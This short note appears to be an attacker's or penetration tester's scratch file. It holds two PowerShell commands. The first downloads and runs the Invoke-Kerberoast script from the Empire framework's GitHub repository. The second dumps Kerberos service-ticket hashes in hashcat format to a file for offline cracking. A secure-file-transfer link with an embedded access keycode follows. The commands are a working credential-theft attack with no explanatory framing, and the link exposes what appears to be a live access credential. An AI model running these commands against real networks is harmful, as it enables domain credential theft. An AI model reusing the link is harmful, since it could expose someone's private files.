iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast


https://securetransfercanada.kroll.com/receive/?packageCode=7qtIkf0UcYTRXqhOG8HxMbbH9BWKziagah9p89VGd3w#keycode=hqWFML4xMoDgQRMkhAb8rqOBidwMFW0RIigi1lE7Bx8
